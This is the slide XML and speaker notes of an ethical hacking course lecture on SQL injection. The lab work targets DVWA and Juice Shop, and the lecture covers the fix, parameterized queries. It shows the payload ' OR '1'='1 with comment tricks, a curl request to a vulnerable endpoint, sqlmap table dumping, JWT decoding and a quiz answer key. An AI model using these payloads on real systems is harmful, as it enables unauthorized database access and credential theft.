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different door into Phase 3, not a different phase — last week we attacked credentials directly, this week we exploit a flaw in how an application builds its own database queries. Same phase, same goal (access), completely different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Phase 3, week two of three — remind the class Phase 3 is intentionally the longest phase because "gaining access" covers genuinely distinct skill sets: credentials, web flaws, and (next week) memory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four is the one that separates a "DVWA-only" understanding from a genuinely transferable skill — make sure students understand that today deliberately includes one target with no built-in "vulnerable" labeling, since that is much closer to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query transformation on the whiteboard if you can: show the ORIGINAL intended query, then the query WITH the injected string spliced in, side by side. Seeing the actual resulting SQL statement is what makes the abstract "changes the logic" claim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doing manual injection before sqlmap, even though it is slower — students who skip straight to automation can run sqlmap successfully without ever understanding what it actually did, which defeats the point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contrast sit for a moment before moving on — one character (') is the entire difference between "returns one expected row" and "dumps the whole table." That gap is worth letting students absorb rather than rushing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sqlmap needs a valid session cookie to reach an authenticated page, exactly like a browser would — this trips people up because it feels like sqlmap should just "know" how to log in. It does not; you still have to hand it a valid session the same way you would for any authenticated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dumped password hash is worth a quick tie-back to Week 6 — this is exactly the kind of hash John or Hashcat would crack next, which is a nice concrete demonstration that these weeks build on each other rather than existing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week's real payoff slide — everything before it was building toward the point that the SAME vulnerability class shows up in wildly different-looking places. Make sure this lands before the terminal example, since it reframes what students are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Decode the JWT live if you can — `echo "&lt;middle-section&gt;" | base64 -d` — seeing "role":"admin" appear in plaintext from a base64 blob is a genuinely satisfying confirmation moment, and it teaches the very real skill of not trusting a tool's claim without verifying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footnote is worth reading verbatim — it is the argument for why the lab makes students do Part 1 (manual) before Part 2 (sqlmap), and it preempts the "why can't I just use sqlmap for everything" question that inevitably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 five is this week's central lesson restated once more — the repetition across objectives, concept slides, and pitfalls is intentional, not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reference pacing — pause here before the lab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flag-format change explicitly before releasing the room — DVWA and Juice Shop are real, independently-maintained vulnerable apps, so tonight's "proof of success" is the actual extracted data and decoded JWT, not a custom flag string like previous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answers: Q1-B, Q2-A, Q3-B, Q4-B. Q4 catches people who assume the password field must be the vulnerable one since it's "the thing being checked" — worth pointing out that the vulnerable field and the field with obvious security implications aren't always the same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anticipation for next week honestly — buffer overflow is usually the most intimidating-sounding topic on the syllabus, but reassure the room that it follows the exact same pattern as this week: understand the mechanism first, then use a tool. It just operates at the memory level instead of the database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595360" y="0"/>
            <a:ext cx="3596335" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1">
            <a:alphaModFix amt="85000"/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9189720" y="2606040"/>
            <a:ext cx="2011680" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="960120"/>
            <a:ext cx="73152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PHASE 3 — GAINING ACCESS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1371600"/>
            <a:ext cx="7589520" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Web Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3520440"/>
            <a:ext cx="7315200" cy="73152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From guessing passwords to exploiting logic flaws in the applications themselves.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4572000"/>
            <a:ext cx="2286000" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16129"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="22D3EE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4572000"/>
            <a:ext cx="2286000" cy="56692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WEEK 7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4572000"/>
            <a:ext cx="3200400" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16129"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="8000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="94A3B8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="4572000"/>
            <a:ext cx="3200400" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Phase 3 of 5: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="635508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Ethical Hacking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COURSE ROADMAP</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Where This Week Fits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1623060" y="3337560"/>
            <a:ext cx="8915400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="1B2740"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772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1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772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Reconnaissance</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2868930" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="30060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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="30060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Scanning &amp;</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Enumeration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5097780" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="22D3EE"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw sx="100000" sy="100000" kx="0" ky="0" algn="bl" rotWithShape="0" blurRad="127000" dist="50800" dir="5400000">
              <a:srgbClr val="22D3EE">
                <a:alpha val="35000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234940" y="2560320"/>
            <a:ext cx="1691640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHASE 3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="52349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Gaining</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234940" y="4434840"/>
            <a:ext cx="1691640" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 85714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF">
              <a:alpha val="10000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234940" y="4434840"/>
            <a:ext cx="1691640" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22D3EE"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>YOU ARE HERE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7326630" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="746379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4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="746379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Maintaining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Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9555480" y="2377440"/>
            <a:ext cx="1965960" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="64748B"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9692640" y="2560320"/>
            <a:ext cx="1691640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHASE 5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9692640" y="2880360"/>
            <a:ext cx="1691640" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Covering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Tracks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="140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7 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>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LEARNING OBJECTIVES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By the End of This Week, You Will Be Able To</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Explain SQL injection at the syntax level</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12344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Understand exactly how untrusted input changes the meaning of a SQL query.</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Construct and test a manual injection payload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12344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Build a working payload by hand and verify it against a real vulnerable form.</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Automate discovery and extraction with sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="12344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Use sqlmap to enumerate databases and dump table contents from a confirmed injection point.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="182880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1264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6720840" y="178308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Recognize injection on a modern, unlabeled target</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="211226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Apply the same underlying logic to a JSON API with no "vulnerable by design" labeling.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="269748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1264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6720840" y="265176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Decode and interpret a JWT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="298094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Confirm exactly what identity an exploit actually obtained.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="3566160"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="61264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06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3520440"/>
            <a:ext cx="44805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Explain the real-world fix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="3849624"/>
            <a:ext cx="44805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Understand why parameterized queries close this entire vulnerability class.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28"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9"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7 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 2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How SQL Injection Actually Works</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setup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web app builds a database query by directly inserting user input into a string, instead of treating that input as pure data.</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trick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Injecting SQL syntax — like ' OR '1'='1 — changes the query's actual logic instead of just supplying a value.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Why it works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'1'='1' is always true, so the modified WHERE clause matches every row, not just the one the form intended.</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comment trick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trailing -- (or #) comments out whatever the original query still had left, so your injected syntax doesn't get broken by leftover characters.</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Say It Out Loud</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"The application trusted my input enough to run it as part of its own instructions." That single sentence is the entire vulnerability class.</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1</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Manual SQL Injection</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Understanding the payload before you ever automate it.</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Constructing and testing an injection payload by hand, directly in a vulnerable form or URL parameter — no tooling beyond a browser or curl. This is the foundation every automated tool builds on top of.</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Confirming a parameter is actually injectable before reaching for automation</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Understanding exactly what a payload does to the underlying query</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Testing on DVWA, a deliberately vulnerable application built for exactly this practice</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Building the intuition that makes sqlmap's output make sense later</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MANUAL SQLI · DVWA</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One Character Changes Everything</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1508760"/>
            <a:ext cx="10881360" cy="2867501"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1913"/>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2227421"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Normal request: id=1 returns exactly one user</a:t>
            </a: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curl -G target/vulnerabilities/sqli/ --data-urlencode "id=1"</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ID: 1  First name: admin  Surname: admin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Injected request: every row matches now</a:t>
